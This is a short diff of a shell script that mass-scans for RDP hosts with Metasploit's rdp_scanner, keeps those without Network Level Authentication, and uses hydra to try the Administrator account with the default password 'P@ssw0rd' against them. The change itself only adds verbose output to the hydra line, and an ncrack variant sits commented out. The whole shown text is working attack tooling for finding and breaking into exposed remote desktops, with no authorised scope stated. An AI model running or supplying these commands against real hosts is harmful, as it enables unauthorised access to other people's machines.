@@ -37,7 +37,7 @@ msfconsole -q -x "use auxiliary/scanner/rdp/rdp_scanner;set threads 200;set rhos
 ##cat nla | grep -a "Requires NLA: No" | cut -d " "  -f 2 | tee nla
 ########################################################################################################################################################################################################################################################################################################################
 echo "----------------------Default Credentials --------------------------------------"
-hydra -l Administrator -p 'P@ssw0rd' -M nla rdp -o rdp_default_credentials.txt 
+hydra -l Administrator -p 'P@ssw0rd' -M nla rdp -o rdp_default_credentials.txt -V
 #ncrack -user  Administrator -pass P@ssw0rd -p rdp -iL port_3389.txt -v
  
  
